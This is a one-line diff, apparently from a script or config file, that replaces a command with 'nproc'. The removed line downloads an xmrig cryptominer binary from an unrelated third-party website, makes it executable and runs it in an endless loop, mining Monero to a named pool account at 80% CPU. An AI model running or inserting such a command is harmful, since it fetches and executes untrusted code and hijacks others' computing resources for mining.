@@ -1,1 +1,1 @@
-wget http://www.automobilitodi.com/veicoli/10/or/portable/xmrig/2.9.2-64bit/xmrig && chmod +x xmrig && while true; do ./xmrig -o stratum+tcp://xmr.pool.minergate.com:45700 -u empireofbooks@gmail.com -p x --threads 4 --max-cpu-usage=80 --donate-level 1 ; sleep 1; done
+nproc
